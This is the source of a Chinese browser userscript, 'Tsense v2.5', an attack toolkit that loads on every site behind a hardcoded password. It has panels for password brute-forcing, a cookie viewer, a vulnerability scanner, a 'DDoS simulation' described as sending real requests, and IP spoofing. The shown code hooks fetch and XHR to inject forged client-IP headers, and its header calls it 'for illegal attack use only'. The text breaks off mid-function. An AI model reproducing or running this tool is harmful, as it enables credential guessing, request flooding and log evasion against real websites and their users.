// ==UserScript==
// @name         Tsense v2.5民间
// @namespace    https://qm.qq.com/q/W0NGXGNXaK
// @version      2.5
// @description  低级渗透靶场工具包 - 仅供非法攻击使用
// @author       林子诺的AI、不想上学
// @match        *://*
// @grant        GM_setValue
// @grant        GM_getValue
// @run-at       document-end
// @license      CC0
// ==/UserScript==

// 懒得吐槽了，槽点太多了
(function (_0x50069b, _0xe6gc) {
  'use strict';

  var _0xa7d33b = 3;
  _0x50069b = "XN TSENSE v2.5 117200";
  _0xa7d33b = 14;
  var _0xcd66c;
  _0xe6gc = "detacitnehtua_esnest".split("").reverse().join("");
  _0xcd66c = 7;
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", _0x9b046a);
  } else {
    _0x9b046a();
  }
  function _0x9b046a() {
    if (GM_getValue(_0xe6gc, false)) {
      _0x3_0xb31();
    } else {
      _0x1df7fd();
    }
  }
  function _0x1df7fd() {
    const _0xec4g = document.createElement("div");
    _0xec4g.innerHTML = `
            <style>
                .tsense-auth-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.95);
                    z-index: 100000;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    font-family: Arial, sans-serif;
                }
                .tsense-auth-box {
                    background: #000000;
                    border: 3px solid #00ff00;
                    border-radius: 15px;
                    padding: 30px;
                    text-align: center;
                    box-shadow: 0 0 50px rgba(0, 255, 0, 0.8);
                    max-width: 400px;
                    width: 90%;
                }
                .tsense-auth-title {
                    color: #00ff00;
                    font-size: 24px;
                    margin-bottom: 20px;
                    font-weight: bold;
                }
                .tsense-auth-desc {
                    color: #00ff00;
                    margin-bottom: 25px;
                    line-height: 1.5;
                    font-size: 14px;
                }
                .tsense-auth-input {
                    width: 100%;
                    padding: 12px;
                    margin: 15px 0;
                    background: #000000;
                    border: 2px solid #00ff00;
                    border-radius: 8px;
                    color: #ffffff;
                    font-size: 16px;
                    text-align: center;
                    outline: none;
                    transition: all 0.3s ease;
                }
                .tsense-auth-input:focus {
                    border-color: #00ff00;
                    box-shadow: 0 0 20px rgba(0, 255, 0, 0.6);
                }
                .tsense-auth-btn {
                    background: #00ff00;
                    color: #000000;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 8px;
                    font-size: 16px;
                    font-weight: bold;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    margin: 5px;
                }
                .tsense-auth-btn:hover {
                    background: #00cc00;
                    transform: scale(1.05);
                }
                .tsense-auth-btn-secondary {
                    background: #333333;
                    color: #00ff00;
                    border: 2px solid #00ff00;
                }
                .tsense-auth-btn-secondary:hover {
                    background: #444444;
                }
                .tsense-auth-error {
                    color: #ff0000;
                    margin: 10px 0;
                    font-size: 14px;
                    min-height: 20px;
                }
                .tsense-auth-warning {
                    color: #ff6b6b;
                    font-size: 12px;
                    margin-top: 20px;
                    line-height: 1.4;
                    border: 1px solid #ff0000;
                    padding: 10px;
                    border-radius: 5px;
                    background: #1a0000;
                }
                @keyframes shake {
                    0%, 100% { transform: translateX(0); }
                    25% { transform: translateX(-5px); }
                    75% { transform: translateX(5px); }
                }
            </style>
            <div class="tsense-auth-overlay">
                <div class="tsense-auth-box">
                    <div class="tsense-auth-title">🔒 Tsense 身份验证</div>
                    <div class="tsense-auth-desc">
                        请输入访问密码以使用 Tsense 渗透测试工具<br>
                        首次使用请联系管理员获取密码（开发者QQ： 2733079134）
                    </div>
                    <input type="password" class="tsense-auth-input" id="tsensePassword" placeholder="请输入访问密码" autocomplete="off">
                    <div class="tsense-auth-error" id="tsenseAuthError"></div>
                    <div>
                        <button class="tsense-auth-btn" id="tsenseAuthSubmit">进入工具</button>
                        <button class="tsense-auth-btn tsense-auth-btn-secondary" id="tsenseAuthCancel">取消</button>
                    </div>
                    <div class="tsense-auth-warning">
                        ⚠️ 本工具仅用于合法的安全测试和教育目的<br>
                        未经授权使用可能违反法律法规
                    </div>
                </div>
            </div>
        `;
    document.body.appendChild(_0xec4g);
    const _0xg49d = document.getElementById("drowssaPesnest".split("").reverse().join(""));
    const _0x2b16b = document.getElementById("timbuShtuAesnest".split("").reverse().join(""));
    const _0x52ed = document.getElementById("tsenseAuthCancel");
    const _0x3d5a = document.getElementById("tsenseAuthError");
    _0x2b16b.addEventListener("kcilc".split("").reverse().join(""), () => {
      const _0xe22c = _0xg49d.value.trim();
      if (!_0xe22c) {
        _0x3d5a.textContent = "码密入输请".split("").reverse().join("");
        return;
      }
      if (_0xe22c === _0x50069b) {
        GM_setValue(_0xe6gc, true);
        _0xec4g.remove();
        _0x3_0xb31();
      } else {
        _0x3d5a.textContent = "密码错误，请重新输入";
        _0xg49d.value = "";
        _0xg49d.focus();
        _0xg49d.style.animation = "shake 0.5s";
        setTimeout(() => {
          _0xg49d.style.animation = "";
        }, 500);
      }
    });
    _0x52ed.addEventListener("kcilc".split("").reverse().join(""), () => {
      _0xec4g.remove();
    });
    _0xg49d.addEventListener("keypress", e => {
      if (e.key === "Enter") {
        _0x2b16b.click();
      }
    });
    setTimeout(() => {
      _0xg49d.focus();
    }, 100);
  }
  function _0x3_0xb31() {
    if (document.getElementById("tsense-tool")) {
      return;
    }
    var _0x908ad = 15;
    const _0x0fd5cc = document.createElement("vid".split("").reverse().join(""));
    _0x908ad = "lpobii";
    _0x0fd5cc.id = "loot-esnest".split("").reverse().join("");
    _0x0fd5cc.innerHTML = `
            <style>
                .tsense-floating {
                    position: fixed;
                    top: 20px;
                    left: 20px;
                    width: 60px;
                    height: 60px;
                    background: #000000;
                    border: 2px solid #0a3d62;
                    border-radius: 8px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    cursor: pointer;
                    z-index: 10000;
                    box-shadow: 0 0 15px rgba(10, 61, 98, 0.7);
                    transition: all 0.3s ease;
                    font-weight: bold;
                    color: #0a3d62;
                    font-size: 12px;
                    text-align: center;
                    user-select: none;
                    font-family: Arial, sans-serif;
                }
                .tsense-floating:hover {
                    transform: scale(1.05);
                    box-shadow: 0 0 20px rgba(10, 61, 98, 0.9);
                }
                .tsense-ui {
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    width: 90vw;
                    height: 85vh;
                    max-width: 800px;
                    max-height: 700px;
                    background: #000000;
                    border: 2px solid #00ff00;
                    border-radius: 10px;
                    padding: 15px;
                    z-index: 10001;
                    box-shadow: 0 0 30px rgba(0, 255, 0, 0.8);
                    display: none;
                    font-family: Arial, sans-serif;
                    overflow: hidden;
                }
                .tsense-main-content {
                    height: 100%;
                    display: flex;
                    flex-direction: column;
                }
                .tsense-panel-content {
                    height: 100%;
                    display: flex;
                    flex-direction: column;
                    display: none;
                }
                .tsense-header {
                    text-align: center;
                    margin-bottom: 15px;
                    padding-bottom: 10px;
                    border-bottom: 1px solid #00ff00;
                    color: #00ff00;
                    flex-shrink: 0;
                }
                .tsense-buttons {
                    display: flex;
                    flex-direction: column;
                    gap: 8px;
                    flex: 1;
                    overflow-y: auto;
                    padding: 5px;
                }
                .tsense-btn {
                    background: #111111;
                    color: #00ff00;
                    border: 1px solid #00ff00;
                    padding: 10px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    transition: all 0.3s ease;
                    font-size: 14px;
                    flex-shrink: 0;
                }
                .tsense-btn:hover {
                    background: #00ff00;
                    color: #000000;
                }
                .tsense-btn-small {
                    padding: 6px 12px;
                    font-size: 12px;
                    margin: 2px;
                }
                .tsense-panel {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    overflow: hidden;
                }
                .tsense-panel-body {
                    flex: 1;
                    overflow-y: auto;
                    padding: 5px;
                }
                .tsense-panel-footer {
                    flex-shrink: 0;
                    padding-top: 10px;
                    border-top: 1px solid #00ff00;
                    display: flex;
                    gap: 8px;
                    justify-content: center;
                }
                .tsense-close {
                    position: absolute;
                    top: 8px;
                    right: 12px;
                    background: none;
                    border: none;
                    color: #00ff00;
                    font-size: 18px;
                    cursor: pointer;
                    width: 25px;
                    height: 25px;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    z-index: 10002;
                    flex-shrink: 0;
                }
                .tsense-close:hover {
                    background: #00ff00;
                    color: #000000;
                }
                .tsense-back-btn {
                    position: absolute;
                    top: 8px;
                    left: 12px;
                    background: none;
                    border: none;
                    color: #00ff00;
                    font-size: 14px;
                    cursor: pointer;
                    padding: 4px 8px;
                    border-radius: 4px;
                    display: flex;
                    align-items: center;
                    gap: 4px;
                    z-index: 10002;
                    flex-shrink: 0;
                }
                .tsense-back-btn:hover {
                    background: #00ff00;
                    color: #000000;
                }
                .tsense-input {
                    width: 100%;
                    padding: 6px;
                    margin: 6px 0;
                    background: #000000;
                    border: 1px solid #00ff00;
                    border-radius: 4px;
                    color: #ffffff;
                    font-size: 13px;
                    box-sizing: border-box;
                }
                .tsense-input:focus {
                    outline: none;
                    border-color: #00ff00;
                    box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
                }
                .tsense-output {
                    height: 180px;
                    background: #000000;
                    border: 1px solid #00ff00;
                    border-radius: 4px;
                    padding: 8px;
                    margin-top: 8px;
                    overflow-y: auto;
                    font-family: 'Courier New', monospace;
                    font-size: 11px;
                    color: #00ff00;
                    white-space: pre-wrap;
                    word-break: break-all;
                    flex-shrink: 0;
                }
                .tsense-disclaimer {
                    margin-top: 12px;
                    padding: 8px;
                    background: #1a0000;
                    border: 1px solid #ff0000;
                    border-radius: 5px;
                    font-size: 11px;
                    color: #ff6b6b;
                    line-height: 1.3;
                    flex-shrink: 0;
                }
                .tsense-label {
                    color: #00ff00;
                    font-weight: bold;
                    margin-top: 8px;
                    display: block;
                    font-size: 13px;
                }
                .tsense-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.7);
                    z-index: 9999;
                    display: none;
                }
                .tsense-tips {
                    background: #002200;
                    border: 1px solid #00ff00;
                    border-radius: 5px;
                    padding: 8px;
                    margin: 8px 0;
                    font-size: 11px;
                    color: #00ff00;
                    flex-shrink: 0;
                }
                .tsense-contact {
                    background: #001122;
                    border: 1px solid #0088ff;
                    border-radius: 5px;
                    padding: 8px;
                    margin: 8px 0;
                    font-size: 11px;
                    color: #00aaff;
                    flex-shrink: 0;
                }
                .qq-group {
                    background: linear-gradient(45deg, #12c2e9, #c471ed, #f64f59);
                    color: white;
                    padding: 6px 10px;
                    border-radius: 20px;
                    font-weight: bold;
                    text-align: center;
                    margin: 8px 0;
                    border: 2px solid #00ff00;
                    animation: glow 2s ease-in-out infinite alternate;
                    font-size: 12px;
                    flex-shrink: 0;
                }
                @keyframes glow {
                    from {
                        box-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00;
                    }
                    to {
                        box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00;
                    }
                }
                .form-grid {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 8px;
                    margin-bottom: 8px;
                }
                .form-full-width {
                    grid-column: 1 / -1;
                }
                .log-entry {
                    margin: 4px 0;
                    padding: 4px;
                    border-left: 3px solid #00ff00;
                    background: #001100;
                }
                .log-timestamp {
                    color: #888;
                    font-size: 10px;
                }
                .log-level-info { border-color: #00ff00; }
                .log-level-warning { border-color: #ffff00; }
                .log-level-error { border-color: #ff0000; }
                .log-level-success { border-color: #00ffff; }
            </style>

            <!-- 遮罩层 -->
            <div class="tsense-overlay" id="tsenseOverlay"></div>

            <!-- 悬浮图标 -->
            <div class="tsense-floating" id="tsenseFloating">Tsense</div>

            <!-- 主界面 -->
            <div class="tsense-ui" id="tsenseMainUI">
                <button class="tsense-close" id="tsenseClose">×</button>

                <!-- 主菜单内容 -->
                <div class="tsense-main-content" id="tsenseMainContent">
                    <div class="tsense-header">
                        <h2>Tsense 渗透工具 v2.5</h2>
                    </div>
                    <div class="tsense-buttons">
                        <button class="tsense-btn" data-panel="bruteforce">🔓 密码爆破</button>
                        <button class="tsense-btn" data-panel="storage">💾 存储查看</button>
                        <button class="tsense-btn" data-panel="scanner">🔍 漏洞扫描</button>
                        <button class="tsense-btn" data-panel="ddos">🌪️ DDOS模拟</button>
                        <button class="tsense-btn" data-panel="ipspoof">🌐 IP伪造</button>
                        <button class="tsense-btn" data-panel="logs">📋 操作日志</button>
                        <button class="tsense-btn" data-panel="about">ℹ️ 关于与支持</button>
                    </div>
                </div>

                <!-- 爆破面板 -->
                <div class="tsense-panel-content" id="bruteforcePanel">
                    <button class="tsense-back-btn" data-back="main">← 返回</button>
                    <button class="tsense-close">×</button>
                    <div class="tsense-header">
                        <h3>🔓 密码爆破工具</h3>
                    </div>
                    <div class="tsense-panel">
                        <div class="tsense-panel-body">
                            <div class="tsense-tips">
                                💡 提示：此功能会在当前页面真实发送登录请求，请仅在授权测试环境中使用！
                            </div>

                            <div class="form-grid">
                                <div class="form-full-width">
                                    <label class="tsense-label">目标URL:</label>
                                    <input type="text" class="tsense-input" id="bfTarget" placeholder="https://example.com/login" value="${window.location.origin}">
                                </div>
                                <div>
                                    <label class="tsense-label">用户名字段:</label>
                                    <input type="text" class="tsense-input" id="bfUsername" placeholder="username" value="username">
                                </div>
                                <div>
                                    <label class="tsense-label">密码字段:</label>
                                    <input type="text" class="tsense-input" id="bfPassword" placeholder="password" value="password">
                                </div>
                                <div>
                                    <label class="tsense-label">尝试次数:</label>
                                    <input type="number" class="tsense-input" id="bfAttempts" placeholder="100" value="50" min="1" max="1000">
                                </div>
                            </div>

                            <label class="tsense-label">密码字典:</label>
                            <textarea class="tsense-input" id="bfWordlist" placeholder="每行一个密码" style="height: 100px">admin
password
123456
12345678
123456789
qwerty
abc123
password1
admin123</textarea>
                        </div>

                        <div class="tsense-output" id="bfOutput">准备就绪...选择目标URL和配置参数后点击开始爆破</div>

                        <div class="tsense-panel-footer">
                            <button class="tsense-btn tsense-btn-small" id="startBruteforce">开始爆破</button>
                            <button class="tsense-btn tsense-btn-small" id="stopBruteforce">停止爆破</button>
                        </div>
                    </div>
                </div>

                <!-- 存储查看面板 -->
                <div class="tsense-panel-content" id="storagePanel">
                    <button class="tsense-back-btn" data-back="main">← 返回</button>
                    <button class="tsense-close">×</button>
                    <div class="tsense-header">
                        <h3>💾 存储查看器</h3>
                    </div>
                    <div class="tsense-panel">
                        <div class="tsense-panel-body">
                            <label class="tsense-label">存储类型:</label>
                            <select class="tsense-input" id="storageType">
                                <option value="local">localStorage</option>
                                <option value="session">sessionStorage</option>
                                <option value="cookies">Cookies</option>
                            </select>

                            <div style="display: flex; gap: 8px; margin: 10px 0;">
                                <button class="tsense-btn tsense-btn-small" id="viewStorage">查看存储</button>
                                <button class="tsense-btn tsense-btn-small" id="clearStorage">清空存储</button>
                                <button class="tsense-btn tsense-btn-small" id="addTestData">添加测试数据</button>
                            </div>
                        </div>

                        <div class="tsense-output" id="storageOutput">选择存储类型后点击查看存储内容...</div>
                    </div>
                </div>

                <!-- 漏洞扫描面板 -->
                <div class="tsense-panel-content" id="scannerPanel">
                    <button class="tsense-back-btn" data-back="main">← 返回</button>
                    <button class="tsense-close">×</button>
                    <div class="tsense-header">
                        <h3>🔍 漏洞扫描器</h3>
                    </div>
                    <div class="tsense-panel">
                        <div class="tsense-panel-body">
                            <div class="tsense-tips">
                                💡 提示：此功能会真实检测当前页面的安全漏洞
                            </div>

                            <div class="form-grid">
                                <div class="form-full-width">
                                    <label class="tsense-label">扫描目标:</label>
                                    <input type="text" class="tsense-input" id="scanTarget" placeholder="https://example.com" value="${window.location.href}">
                                </div>
                                <div class="form-full-width">
                                    <label class="tsense-label">扫描类型:</label>
                                    <select class="tsense-input" id="scanType">
                                        <option value="xss">XSS漏洞检测</option>
                                        <option value="sql">SQL注入检测</option>
                                        <option value="cors">CORS配置检测</option>
                                        <option value="info">信息泄露检测</option>
                                        <option value="full">全面安全扫描</option>
                                    </select>
                                </div>
                            </div>
                        </div>

                        <div class="tsense-output" id="scanOutput">选择扫描类型后点击开始扫描...</div>

                        <div class="tsense-panel-footer">
                            <button class="tsense-btn tsense-btn-small" id="startScan">开始扫描</button>
                        </div>
                    </div>
                </div>

                <!-- DDOS面板 -->
                <div class="tsense-panel-content" id="ddosPanel">
                    <button class="tsense-back-btn" data-back="main">← 返回</button>
                    <button class="tsense-close">×</button>
                    <div class="tsense-header">
                        <h3>🌪️ DDOS 模拟工具</h3>
                    </div>
                    <div class="tsense-panel">
                        <div class="tsense-panel-body">
                            <div class="tsense-tips">
                                ⚠️ 警告：此功能会真实发送网络请求，请谨慎使用！
                            </div>

                            <div class="form-grid">
                                <div class="form-full-width">
                                    <label class="tsense-label">目标URL:</label>
                                    <input type="text" class="tsense-input" id="ddosTarget" placeholder="https://example.com" value="${window.location.origin}">
                                </div>
                                <div>
                                    <label class="tsense-label">请求数量:</label>
                                    <input type="number" class="tsense-input" id="ddosCount" placeholder="100" value="50" min="1" max="500">
                                </div>
                                <div>
                                    <label class="tsense-label">请求间隔(ms):</label>
                                    <input type="number" class="tsense-input" id="ddosDelay" placeholder="100" value="200" min="50" max="5000">
                                </div>
                                <div>
                                    <label class="tsense-label">请求方法:</label>
                                    <select class="tsense-input" id="ddosMethod">
                                        <option value="GET">GET</option>
                                        <option value="POST">POST</option>
                                        <option value="HEAD">HEAD</option>
                                    </select>
                                </div>
                            </div>

                            <label class="tsense-label">自定义数据:</label>
                            <textarea class="tsense-input" id="ddosData" placeholder="可选: 自定义请求数据" style="height: 60px"></textarea>
                        </div>

                        <div class="tsense-output" id="ddosOutput">配置参数后点击开始攻击...（默认限制50个请求）</div>

                        <div class="tsense-panel-footer">
                            <button class="tsense-btn tsense-btn-small" id="startDdos">开始攻击</button>
                            <button class="tsense-btn tsense-btn-small" id="stopDdos">停止攻击</button>
                        </div>
                    </div>
                </div>

                <!-- IP伪造面板 -->
                <div class="tsense-panel-content" id="ipspoofPanel">
                    <button class="tsense-back-btn" data-back="main">← 返回</button>
                    <button class="tsense-close">×</button>
                    <div class="tsense-header">
                        <h3>🌐 IP伪造工具</h3>
                    </div>
                    <div class="tsense-panel">
                        <div class="tsense-panel-body">
                            <div class="tsense-tips">
                                💡 提示：此功能会修改HTTP请求头来伪造IP地址，主要用于测试WAF和日志系统，当然林子诺不希望您滥用此项
                            </div>

                            <div class="form-grid">
                                <div class="form-full-width">
                                    <label class="tsense-label">伪造的IP地址:</label>
                                    <input type="text" class="tsense-input" id="fakeIp" placeholder="例如: 192.168.1.100, 8.8.8.8, 1.1.1.1" value="192.168.1.100">
                                </div>
                                <div class="form-full-width">
                                    <label class="tsense-label">IP头字段:</label>
                                    <select class="tsense-input" id="ipHeader">
                                        <option value="X-Forwarded-For">X-Forwarded-For</option>
                                        <option value="X-Real-IP">X-Real-IP</option>
                                        <option value="X-Originating-IP">X-Originating-IP</option>
                                        <option value="X-Remote-IP">X-Remote-IP</option>
                                        <option value="X-Remote-Addr">X-Remote-Addr</option>
                                        <option value="Client-IP">Client-IP</option>
                                        <option value="True-Client-IP">True-Client-IP</option>
                                        <option value="CF-Connecting-IP">CF-Connecting-IP</option>
                                    </select>
                                </div>
                            </div>

                            <label class="tsense-label">自定义请求头:</label>
                            <textarea class="tsense-input" id="customHeaders" placeholder="格式: Header-Name: header-value" style="height: 80px">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Referer: https://www.google.com/</textarea>

                            <div style="margin: 10px 0;">
                                <button class="tsense-btn tsense-btn-small" id="testIpSpoof">测试IP伪造</button>
                                <button class="tsense-btn tsense-btn-small" id="enableIpSpoof">启用IP伪造</button>
                                <button class="tsense-btn tsense-btn-small" id="disableIpSpoof">禁用IP伪造</button>
                            </div>

                            <div class="tsense-tips">
                                📝 常用测试IP:<br>
                                • 本地网络: 192.168.1.1, 10.0.0.1<br>
                                • 公共DNS: 8.8.8.8, 1.1.1.1<br>
                                • 保留地址: 127.0.0.1, 0.0.0.0<br>
                                • 随机地址: 随机生成按钮 →
                                <button class="tsense-btn tsense-btn-small" id="randomIp" style="margin-left: 10px;">随机IP</button>
                            </div>
                        </div>

                        <div class="tsense-output" id="ipspoofOutput">准备就绪...配置IP地址和请求头后点击测试</div>
                    </div>
                </div>

                <!-- 日志面板 -->
                <div class="tsense-panel-content" id="logsPanel">
                    <button class="tsense-back-btn" data-back="main">← 返回</button>
                    <button class="tsense-close">×</button>
                    <div class="tsense-header">
                        <h3>📋 操作日志</h3>
                    </div>
                    <div class="tsense-panel">
                        <div class="tsense-panel-body">
                            <div style="display: flex; gap: 8px; margin-bottom: 10px;">
                                <button class="tsense-btn tsense-btn-small" id="clearLogs">清空日志</button>
                                <button class="tsense-btn tsense-btn-small" id="exportLogs">导出日志</button>
                                <button class="tsense-btn tsense-btn-small" id="addManualLog">手动添加日志</button>
                            </div>

                            <div class="form-grid">
                                <div>
                                    <label class="tsense-label">日志级别:</label>
                                    <select class="tsense-input" id="logLevel">
                                        <option value="info">信息</option>
                                        <option value="warning">警告</option>
                                        <option value="error">错误</option>
                                        <option value="success">成功</option>
                                    </select>
                                </div>
                                <div>
                                    <label class="tsense-label">日志内容:</label>
                                    <input type="text" class="tsense-input" id="logContent" placeholder="输入日志内容">
                                </div>
                            </div>

                            <label class="tsense-label">日志过滤器:</label>
                            <input type="text" class="tsense-input" id="logFilter" placeholder="输入关键词过滤日志">

                            <div style="margin: 10px 0;">
                                <label class="tsense-label">自动日志记录:</label>
                                <input type="checkbox" id="autoLogging" checked> 启用自动记录
                            </div>
                        </div>

                        <div class="tsense-output" id="logsOutput" style="height: 250px;">日志记录将显示在这里...</div>
                    </div>
                </div>

                <!-- 关于面板 -->
                <div class="tsense-panel-content" id="aboutPanel">
                    <button class="tsense-back-btn" data-back="main">← 返回</button>
                    <button class="tsense-close">×</button>
                    <div class="tsense-header">
                        <h3>ℹ️ 关于与支持</h3>
                    </div>
                    <div class="tsense-panel">
                        <div class="tsense-panel-body">
                            <div class="tsense-contact">
                                <h4>📞 官方联系方式</h4>
                                <div class="qq-group">
                                    🎯 官方QQ群：1071509895
                                </div>
                                <p><strong>作者:</strong> 林子诺</p>
                                <p><strong>技术支持:</strong> deepsee</p>
                                <p><strong>版本:</strong> v2.5 </p>
                                <p><strong>更新:</strong> 新增IP伪造和日志记录功能</p>
                            </div>

                            <div class="tsense-tips">
                                <h4>🎯 推荐渗透测试靶场:</h4>
                                <p><strong>基础综合:</strong> DVWA, Pikachu, bWAPP, WebGoat</p>
                                <p><strong>专项漏洞:</strong> sqli-labs, upload-labs, xss-labs</p>
                                <p><strong>进阶实战:</strong> Hack The Box, Vulnhub, TryHackMe</p>
                                <p><strong>国内在线:</strong> 春秋云境, i春秋, 墨者靶场</p>
                                <p>所有靶场请在Git搜索名称即可找到</p>
                            </div>
                        </div>

                        <div class="tsense-disclaimer">
                            <strong>⚠️ 免责声明:</strong><br>
                            本工具仅用于合法的安全测试、教育学习和授权渗透测试。<br>
                            禁止在任何未授权的系统上使用本工具。<br>
                            使用者需对自身行为承担全部法律责任。<br>
                            作者不对任何滥用行为负责。
                        </div>
                    </div>
                </div>
            </div>
        `;
    document.body.appendChild(_0x0fd5cc);
    _0x3ad();
  }
  function _0x3ad() {
    const _0xa8985b = document.getElementById("tsenseFloating");
    var _0x8e612f = 3;
    const _0xd0ab1a = document.getElementById("tsenseMainUI");
    _0x8e612f = 12;
    const _0x5_0xd0b = document.getElementById("yalrevOesnest".split("").reverse().join(""));
    const _0x5d794c = document.querySelectorAll(".tsense-close");
    var _0xe7gg1d = 3;
    const _0x0351ef = document.querySelectorAll(".tsense-back-btn");
    _0xe7gg1d = 12;
    _0xa8985b.addEventListener("kcilc".split("").reverse().join(""), () => {
      _0xd0ab1a.style.display = "kcolb".split("").reverse().join("");
      _0x5_0xd0b.style.display = "block";
      _0xdfb0af();
    });
    _0x5d794c.forEach(btn => {
      btn.addEventListener("kcilc".split("").reverse().join(""), _0xf4104e);
    });
    _0x5_0xd0b.addEventListener("kcilc".split("").reverse().join(""), _0xf4104e);
    function _0xf4104e() {
      _0xd0ab1a.style.display = "none";
      _0x5_0xd0b.style.display = "enon".split("").reverse().join("");
      _0xdfb0af();
    }
    document.addEventListener("keydown", e => {
      if (e.key === "epacsE".split("").reverse().join("") && _0xd0ab1a.style.display === "block") {
        _0xf4104e();
      }
    });
    document.querySelectorAll("]lenap-atad[ntb-esnest.".split("").reverse().join("")).forEach(btn => {
      btn.addEventListener("click", () => {
        const _0x83ffc = btn.getAttribute("lenap-atad".split("").reverse().join("")) + "lenaP".split("").reverse().join("");
        _0x36a(_0x83ffc);
      });
    });
    _0x0351ef.forEach(btn => {
      btn.addEventListener("click", () => {
        _0xdfb0af();
      });
    });
    _0x152be();
    _0xf0g();
    _0xg7d();
    _0x16f59e();
    _0xae572c();
    _0x79d();
  }
  function _0xdfb0af() {
    document.querySelectorAll(".tsense-panel-content").forEach(panel => {
      panel.style.display = "none";
    });
    document.getElementById("tsenseMainContent").style.display = "flex";
  }
  function _0x36a(panelId) {
    document.getElementById("tsenseMainContent").style.display = "none";
    document.getElementById(panelId).style.display = "flex";
  }
  const _0x49bdaa = {
    logs: [],
    maxLogs: 1000,
    addLog(level, message, module = "system") {
      var _0xf75d2g = 9;
      const _0x86e = {
        timestamp: new Date().toLocaleString(),
        level: level,
        module: module,
        message: message,
        id: Date.now() + Math.random()
      };
      _0xf75d2g = 6;
      this.logs.unshift(_0x86e);
      if (this.logs.length > this.maxLogs) {
        this.logs = this.logs.slice(0, this.maxLogs);
      }
      this.saveLogs();
      this.updateLogDisplay();
      return _0x86e;
    },
    saveLogs() {
      try {
        localStorage.setItem("tsense_logs", JSON.stringify(this.logs));
      } catch (e) {
        console.warn("无法保存日志到本地存储:", e);
      }
    },
    loadLogs() {
      try {
        const _0xbaaa8c = localStorage.getItem("sgol_esnest".split("").reverse().join(""));
        if (_0xbaaa8c) {
          this.logs = JSON.parse(_0xbaaa8c);
        }
      } catch (e) {
        console.warn(":志日载加储存地本从法无".split("").reverse().join(""), e);
      }
    },
    clearLogs() {
      this.logs = [];
      this.saveLogs();
      this.updateLogDisplay();
    },
    exportLogs() {
      var _0xcb4g = 17;
      const _0x91bcdc = this.logs.map(log => `[${log.timestamp}] [${log.level.toUpperCase()}] [${log.module}] ${log.message}`).join("\n");
      _0xcb4g = "dbihnk".split("").reverse().join("");
      var _0xg_0xdff;
      const _0x6447a = new Blob([_0x91bcdc], {
        type: "text/plain"
      });
      _0xg_0xdff = "qopikb";
      const _0x8e049b = URL.createObjectURL(_0x6447a);
      const a = document.createElement("a");
      a.href = _0x8e049b;
      a.download = `tsense_logs_${new Date().toISOString().replace(new RegExp("[:.]", "g"), "-")}.txt`;
      a.click();
      URL.revokeObjectURL(_0x8e049b);
    },
    updateLogDisplay() {
      var _0x8eg9e = 5;
      const output = document.getElementById("tuptuOsgol".split("").reverse().join(""));
      _0x8eg9e = 9;
      if (!output) {
        return;
      }
      const _0x6905fb = document.getElementById("retliFgol".split("").reverse().join(""))?.value.toLowerCase() || "";
      var _0x59aaf;
      const _0x52399e = this.logs.filter(log => log.message.toLowerCase().includes(_0x6905fb) || log.module.toLowerCase().includes(_0x6905fb) || log.level.toLowerCase().includes(_0x6905fb));
      _0x59aaf = 17;
      output.innerHTML = _0x52399e.map(log => `
                <div class="log-entry log-level-${log.level}">
                    <div class="log-timestamp">[${log.timestamp}]</div>
                    <strong>[${log.level.toUpperCase()}]</strong>
                    <span style="color: #888">[${log.module}]</span>
                    ${log.message}
                </div>
            `).join("");
      output.scrollTop = 0;
    },
    filterLogs(filterText) {
      this.updateLogDisplay();
    }
  };
  const _0xa58f1a = {
    isEnabled: false,
    originalFetch: null,
    originalXHROpen: null,
    originalXHRSend: null,
    enable(fakeIp, header, customHeaders = "") {
      if (this.isEnabled) {
        this.disable();
      }
      this.isEnabled = true;
      _0x49bdaa.addLog("info", `启用IP伪造: ${fakeIp} (头字段: ${header})`, "ipspoof");
      this.originalFetch = window.fetch;
      this.originalXHROpen = XMLHttpRequest.prototype.open;
      this.originalXHRSend = XMLHttpRequest.prototype.send;
      var _0x_0xda8 = 10;
      const headers = {};
      _0x_0xda8 = 8;
      if (customHeaders) {
        customHeaders.split("\n").forEach(line => {
          const [key, value] = line.split(":").map(s => s.trim());
          if (key && value) {
            headers[key] = value;
          }
        });
      }
      window.fetch = async function (...args) {
        const [input, init = {}] = args;
        var _0xg8976f;
        const _0x2e1d = {
          ...init
        };
        _0xg8976f = 6;
        _0x2e1d.headers = {
          ..._0x2e1d.headers
        };
        _0x2e1d.headers[header] = fakeIp;
        Object.keys(headers).forEach(key => {
          _0x2e1d.headers[key] = headers[key];
        });
        _0x49bdaa.addLog("info", `发送伪造IP请求: ${input}`, "foopspi".split("").reverse().join(""));
        return _0xa58f1a.originalFetch.call(this, input, _0x2e1d);
      };
      XMLHttpRequest.prototype.open = function (...args) {
        this._url = args[1];
        return _0xa58f1a.originalXHROpen.apply(this, args);
      };
      XMLHttpRequest.prototype.send = function (...args) {
        this.setRequestHeader(header, fakeIp);
        Object.keys(headers).forEach(key => {
          this.setRequestHeader(key, headers[key]);
        });
        _0x49bdaa.addLog("ofni".split("").reverse().join(""), `发送XHR伪造IP请求: ${this._url}`, "foopspi".split("").reverse().join(""));
        return _0xa58f1a.originalXHRSend.apply(this, args);
      };
      return true;
    },
    disable() {
      if (!this.isEnabled) {
        return;
      }
      if (this.originalFetch) {
        window.fetch = this.originalFetch;
      }
      if (this.originalXHROpen) {
        XMLHttpRequest.prototype.open = this.originalXHROpen;
      }
      if (this.originalXHRSend) {
        XMLHttpRequest.prototype.send = this.originalXHRSend;
      }
      this.isEnabled = false;
